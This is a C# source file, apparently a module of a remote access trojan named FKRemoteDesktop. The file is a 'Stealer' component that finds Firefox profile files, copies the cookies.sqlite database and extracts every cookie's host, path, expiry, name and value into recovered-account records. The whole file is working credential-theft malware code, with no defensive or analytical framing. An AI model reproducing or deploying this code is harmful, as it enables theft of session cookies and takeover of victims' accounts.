using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Stealer.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class MozillaCookieReader : IAccountReader
    {
        public string ApplicationName => "Mozilla";
        public string KeyName => "Cookies";

        public List<string> _domainList = new List<string>();
        public List<string> _geckoCookieList = new List<string>();

        public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
        public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
        public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

        public List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            List<string> list = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel)
            {
                return list;
            }
            try
            {
                string[] directories = Directory.GetDirectories(baseDirectory);
                foreach (string path in directories)
                {
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(path);
                        FileInfo[] files2 = directoryInfo.GetFiles();
                        bool flag = false;
                        for (int j = 0; j < files2.Length; j++)
                        {
                            if (flag)
                            {
                                break;
                            }
                            for (int k = 0; k < files.Length; k++)
                            {
                                if (flag)
                                {
                                    break;
                                }
                                string a = files[k];
                                FileInfo fileInfo = files2[j];
                                if (a == fileInfo.Name)
                                {
                                    flag = true;
                                    list.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                        {
                            if (!list.Contains(item))
                            {
                                list.Add(item);
                            }
                        }
                        directoryInfo = null;
                    }
                    catch
                    {
                    }
                }
                return list;
            }
            catch
            {
                return list;
            }
        }

        private string Prbn(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Roaming\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception) { }
            return text.Replace(" ", string.Empty);
        }

        private string Plbn(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Local\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception) { }
            return text.Replace(" ", string.Empty);
        }

        private string GetProfileName(string path)
        {
            try
            {
                string[] array = path.Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                return array[array.Length - 1];
            }
            catch { }
            return "Unknown";
        }

        public void GetHostAndGeckoCookies(string profile, string browser_name, string profile_name)
        {
            try
            {
                string text = Path.Combine(profile, "cookies.sqlite");
                CNT cNT = new CNT(CreateTempCopy(text));
                cNT.ReadTable("moz_cookies");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    try
                    {
                        _domainList.Add(cNT.ParseValue(i, "host").Trim());
                        _geckoCookieList.Add(cNT.ParseValue(i, "host").Trim() + "\t" +
                            (cNT.ParseValue(i, "isSecure") == "1") + "\t" +
                            cNT.ParseValue(i, "path").Trim() + "\t" +
                            (cNT.ParseValue(i, "isSecure") == "1") + "\t" +
                            cNT.ParseValue(i, "expiry").Trim() + "\t" +
                            cNT.ParseValue(i, "name").Trim() + "\t" +
                            cNT.ParseValue(i, "value"));
                    }
                    catch { }
                }
            }
            catch { }
        }

        public string CreateTempCopy(string filePath)
        {
            string text = CreateTempPath();
            File.Copy(filePath, text, overwrite: true);
            return text;
        }

        public string CreateTempPath()
        {
            return Path.Combine(TempDirectory, "tempDataBase" +
                DateTime.Now.ToString("O").Replace(':', '_') +
                Thread.CurrentThread.GetHashCode() +
                Thread.CurrentThread.ManagedThreadId);
        }

        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            List<RecoveredAccount> result = new List<RecoveredAccount>();

            try
            {
                List<string> listFile = new List<string>();
                listFile.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
                listFile.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));

                foreach (string item in listFile)
                {
                    string fullName = new FileInfo(item).Directory.FullName;
                    string text = item.Contains(RoamingAppData) ? Prbn(fullName) : Plbn(fullName);
                    string profile_name = GetProfileName(fullName);

                    GetHostAndGeckoCookies(fullName, text, profile_name);

                    string sDataInfo = "";
                    foreach (var cookie in _geckoCookieList)
                    {
                        sDataInfo += cookie;
                    }
                    result.Add(new RecoveredAccount()
                    {
                        Username = "N/A",
                        Password = "N/A",
                        Url = sDataInfo,
                        KeyName = KeyName,
                        Application = ApplicationName
                    });
                }
            }
            catch (Exception ex)
            {
                result.Add(new RecoveredAccount()
                {
                    Username = "N/A",
                    Password = "N/A",
                    Url = "访问出错: " + ex.Message,
                    KeyName = KeyName,
                    Application = ApplicationName
                });
            }

            if (result.Count <= 0)
            {
                result.Add(new RecoveredAccount()
                {
                    Username = "N/A",
                    Password = "N/A",
                    Url = "N/A",
                    KeyName = KeyName,
                    Application = ApplicationName
                });
            }
            return result;
        }
    }
}